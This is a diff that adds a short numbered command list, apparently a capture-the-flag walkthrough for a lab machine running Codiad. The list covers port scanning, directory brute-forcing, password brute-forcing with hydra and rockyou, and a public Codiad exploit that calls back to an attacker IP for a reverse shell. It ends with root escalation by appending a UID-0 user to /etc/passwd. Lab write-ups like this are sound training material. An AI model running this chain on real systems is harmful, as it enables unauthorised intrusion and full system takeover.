@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.1.46
+2 - gobuster dir -u http://10.10.1.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+3 - hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.1.46 http-get "/inferno"
+4 - searchsploit "codiad"
+5 - searchsploit -m 49705
+6 - python3 49705.py http://ADMIN_PASSWORD@10.10.1.46/inferno/ admin dante1 10.8.94.51 4444 linux
+7 - ls -la /home/dante/Downloads
+8 - ssh dante@10.10.1.46
+9 - cat local.txt
+10 - mkpasswd -m sha-512 password
+11 - printf 'test:<hash>:0:0:root:/home/test:/bin/bash' | sudo tee -a /etc/passwd
+12 - su test
+13 - cat /root/proof.txt
